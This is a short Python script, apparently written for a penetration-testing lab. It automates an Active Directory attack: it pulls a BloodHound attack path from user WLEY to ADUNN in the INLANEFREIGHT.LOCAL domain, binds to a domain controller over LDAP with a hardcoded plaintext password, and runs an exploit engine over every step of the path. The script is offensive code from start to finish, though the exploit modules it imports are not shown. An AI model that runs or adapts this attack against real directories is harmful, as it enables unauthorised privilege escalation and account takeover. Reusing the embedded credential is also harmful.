from core.database import DatabaseManager
from core.pathfinder import Pathfinder
from core.exploit import ExploitEngine
from core.task_manager import TaskManager
from ldap3 import Server, Connection, ALL

# 1. Find the Path (Neo4j)
db = DatabaseManager("bolt://localhost:7687", "neo4j", "bloodhoundcommunityedition")
db.connect()
pf = Pathfinder(db)
path = pf.find_best_path("WLEY@INLANEFREIGHT.LOCAL", "ADUNN@INLANEFREIGHT.LOCAL")

# 2. Initialize Exploitation (LDAP)
server = Server('172.16.5.5', use_ssl=True, get_info=ALL)
conn = Connection(server, user='INLANEFREIGHT\\WLEY', password='transporter@4', auto_bind=True)

# 3. Map and Execute
engine = ExploitEngine(conn)
tm = TaskManager(engine)

tm.build_plan(path)
tm.execute_all()

db.close()
conn.unbind()